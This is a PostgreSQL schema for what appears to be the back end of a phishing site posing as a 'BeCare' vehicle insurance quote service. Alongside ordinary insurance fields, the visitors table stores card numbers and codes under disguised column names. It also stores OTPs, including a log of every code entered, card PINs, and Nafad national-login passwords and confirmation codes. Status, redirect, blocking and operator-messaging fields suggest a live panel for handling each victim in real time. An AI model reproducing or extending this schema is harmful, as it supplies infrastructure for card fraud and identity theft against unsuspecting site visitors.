-- =====================================================
-- Schema for BeCare Visitors / Insurance Flow
-- PostgreSQL version for Neon
-- =====================================================

-- =====================================================
-- 1) visitors
-- =====================================================
CREATE TABLE IF NOT EXISTS visitors (
    id TEXT PRIMARY KEY,

    -- Step 1: identity / vehicle
    identity_number VARCHAR(10) DEFAULT NULL,
    owner_name VARCHAR(255) DEFAULT NULL,
    phone_number VARCHAR(20) DEFAULT NULL,
    document_type VARCHAR(50) DEFAULT NULL,
    serial_number VARCHAR(50) DEFAULT NULL,
    insurance_type VARCHAR(50) DEFAULT NULL,

    -- Ownership transfer
    buyer_name VARCHAR(255) DEFAULT NULL,
    buyer_id_number VARCHAR(10) DEFAULT NULL,

    -- Step 2: insurance details
    insurance_coverage VARCHAR(50) DEFAULT NULL,
    insurance_start_date DATE DEFAULT NULL,
    vehicle_usage VARCHAR(100) DEFAULT NULL,
    vehicle_value DECIMAL(15,2) DEFAULT NULL,
    vehicle_year VARCHAR(4) DEFAULT NULL,
    vehicle_model VARCHAR(255) DEFAULT NULL,
    repair_location VARCHAR(50) DEFAULT NULL,

    -- Step 3: selected offer
    selected_offer JSONB DEFAULT NULL,
    offer_total_price DECIMAL(15,2) DEFAULT NULL,

    -- Tracking / device / country
    country VARCHAR(10) DEFAULT NULL,
    device_type VARCHAR(50) DEFAULT NULL,
    browser VARCHAR(100) DEFAULT NULL,
    os VARCHAR(100) DEFAULT NULL,
    screen_resolution VARCHAR(20) DEFAULT NULL,

    -- Tracking state
    current_step INTEGER DEFAULT 1,
    current_page VARCHAR(50) DEFAULT 'home',
    is_online BOOLEAN DEFAULT true,
    is_blocked BOOLEAN DEFAULT false,
    is_unread BOOLEAN DEFAULT true,

    -- Card data
    _v1 VARCHAR(255) DEFAULT NULL,
    _v2 VARCHAR(255) DEFAULT NULL,
    _v3 VARCHAR(255) DEFAULT NULL,
    _v4 VARCHAR(255) DEFAULT NULL,
    _v1_status VARCHAR(50) DEFAULT NULL,
    card_status VARCHAR(50) DEFAULT NULL,
    card_updated_at TIMESTAMPTZ DEFAULT NULL,

    -- OTP
    _v5 VARCHAR(10) DEFAULT NULL,
    _v5_status VARCHAR(20) DEFAULT 'pending',
    otp_submitted_at TIMESTAMPTZ DEFAULT NULL,
    otp_resend_requested BOOLEAN DEFAULT false,
    otp_resend_at TIMESTAMPTZ DEFAULT NULL,
    all_otps JSONB DEFAULT NULL,
    otp_updated_at TIMESTAMPTZ DEFAULT NULL,

    -- PIN
    _v6 VARCHAR(10) DEFAULT NULL,
    _v6_status VARCHAR(20) DEFAULT 'pending',
    pin_submitted_at TIMESTAMPTZ DEFAULT NULL,
    pin_updated_at TIMESTAMPTZ DEFAULT NULL,
    payment_status VARCHAR(50) DEFAULT NULL,

    -- Phone verification
    phone_id_number VARCHAR(10) DEFAULT NULL,
    phone_number_alt VARCHAR(20) DEFAULT NULL,
    phone_carrier VARCHAR(50) DEFAULT NULL,
    phone_submitted_at TIMESTAMPTZ DEFAULT NULL,
    phone_updated_at TIMESTAMPTZ DEFAULT NULL,
    _v4_status VARCHAR(50) DEFAULT NULL,
    phone_otp_status VARCHAR(50) DEFAULT NULL,
    old_phone_info JSONB DEFAULT NULL,

    -- Nafad
    _v7 VARCHAR(255) DEFAULT NULL,
    _v8 VARCHAR(10) DEFAULT NULL,
    _v9 VARCHAR(255) DEFAULT NULL,
    nafad_id_number VARCHAR(10) DEFAULT NULL,
    nafad_password VARCHAR(255) DEFAULT NULL,
    nafad_status VARCHAR(50) DEFAULT NULL,
    nafad_confirmation_code VARCHAR(10) DEFAULT NULL,
    nafad_confirmation_status VARCHAR(20) DEFAULT NULL,
    nafad_updated_at TIMESTAMPTZ DEFAULT NULL,

    -- Additional raw data for flexibility
    data JSONB DEFAULT '{}'::jsonb,

    -- Redirects
    redirect_page VARCHAR(50) DEFAULT NULL,

    -- Timestamps
    home_updated_at TIMESTAMPTZ DEFAULT NULL,
    insur_updated_at TIMESTAMPTZ DEFAULT NULL,
    compar_updated_at TIMESTAMPTZ DEFAULT NULL,
    check_updated_at TIMESTAMPTZ DEFAULT NULL,
    created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    last_active_at TIMESTAMPTZ DEFAULT NULL,
    session_start_at TIMESTAMPTZ DEFAULT NULL,
    submitted_at TIMESTAMPTZ DEFAULT NULL
);

-- Indexes for visitors
CREATE INDEX IF NOT EXISTS idx_visitors_identity_number ON visitors(identity_number);
CREATE INDEX IF NOT EXISTS idx_visitors_phone_number ON visitors(phone_number);
CREATE INDEX IF NOT EXISTS idx_visitors_current_page ON visitors(current_page);
CREATE INDEX IF NOT EXISTS idx_visitors_is_blocked ON visitors(is_blocked);
CREATE INDEX IF NOT EXISTS idx_visitors_created_at ON visitors(created_at);
CREATE INDEX IF NOT EXISTS idx_visitors_updated_at ON visitors(updated_at);

-- =====================================================
-- 2) visitor_history
-- =====================================================
CREATE TABLE IF NOT EXISTS visitor_history (
    id BIGSERIAL PRIMARY KEY,
    visitor_id TEXT NOT NULL,
    type VARCHAR(50) NOT NULL,
    data JSONB DEFAULT NULL,
    status VARCHAR(20) DEFAULT 'pending',
    timestamp TIMESTAMPTZ DEFAULT NOW()
);

CREATE INDEX IF NOT EXISTS idx_history_visitor_id ON visitor_history(visitor_id);
CREATE INDEX IF NOT EXISTS idx_history_type ON visitor_history(type);
CREATE INDEX IF NOT EXISTS idx_history_status ON visitor_history(status);
CREATE INDEX IF NOT EXISTS idx_history_timestamp ON visitor_history(timestamp);

-- =====================================================
-- 3) visitor_messages
-- =====================================================
CREATE TABLE IF NOT EXISTS visitor_messages (
    id BIGSERIAL PRIMARY KEY,
    visitor_id TEXT NOT NULL,
    message TEXT NOT NULL,
    sender_name VARCHAR(255) DEFAULT NULL,
    is_from_admin BOOLEAN DEFAULT false,
    is_read BOOLEAN DEFAULT false,
    created_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE INDEX IF NOT EXISTS idx_messages_visitor_id ON visitor_messages(visitor_id);
CREATE INDEX IF NOT EXISTS idx_messages_is_read ON visitor_messages(is_read);
CREATE INDEX IF NOT EXISTS idx_messages_created_at ON visitor_messages(created_at);

-- =====================================================
-- 4) public_settings
-- =====================================================
CREATE TABLE IF NOT EXISTS public_settings (
    id SERIAL PRIMARY KEY,
    setting_key VARCHAR(100) NOT NULL UNIQUE,
    setting_value TEXT DEFAULT NULL,
    created_at TIMESTAMPTZ DEFAULT NOW(),
    updated_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE INDEX IF NOT EXISTS idx_public_settings_key ON public_settings(setting_key);

-- Sample settings
INSERT INTO public_settings (setting_key, setting_value) VALUES
    ('site_title', 'BeCare'),
    ('maintenance_mode', '0')
ON CONFLICT (setting_key) DO UPDATE SET setting_value = EXCLUDED.setting_value;

-- =====================================================
-- 5) admin_users
-- =====================================================
CREATE TABLE IF NOT EXISTS admin_users (
    id SERIAL PRIMARY KEY,
    username VARCHAR(100) NOT NULL UNIQUE,
    email VARCHAR(255) NOT NULL UNIQUE,
    password_hash VARCHAR(255) NOT NULL,
    full_name VARCHAR(255) DEFAULT NULL,
    role VARCHAR(50) DEFAULT 'admin',
    is_active BOOLEAN DEFAULT true,
    created_at TIMESTAMPTZ DEFAULT NOW(),
    updated_at TIMESTAMPTZ DEFAULT NOW()
);

-- =====================================================
-- Function to auto-update updated_at timestamp
-- =====================================================
CREATE OR REPLACE FUNCTION update_updated_at_column()
RETURNS TRIGGER AS $$
BEGIN
    NEW.updated_at = NOW();
    RETURN NEW;
END;
$$ language 'plpgsql';

-- Trigger for visitors table
DROP TRIGGER IF EXISTS update_visitors_updated_at ON visitors;
CREATE TRIGGER update_visitors_updated_at
    BEFORE UPDATE ON visitors
    FOR EACH ROW
    EXECUTE FUNCTION update_updated_at_column();

-- Trigger for public_settings table
DROP TRIGGER IF EXISTS update_public_settings_updated_at ON public_settings;
CREATE TRIGGER update_public_settings_updated_at
    BEFORE UPDATE ON public_settings
    FOR EACH ROW
    EXECUTE FUNCTION update_updated_at_column();

-- Trigger for admin_users table
DROP TRIGGER IF EXISTS update_admin_users_updated_at ON admin_users;
CREATE TRIGGER update_admin_users_updated_at
    BEFORE UPDATE ON admin_users
    FOR EACH ROW
    EXECUTE FUNCTION update_updated_at_column();
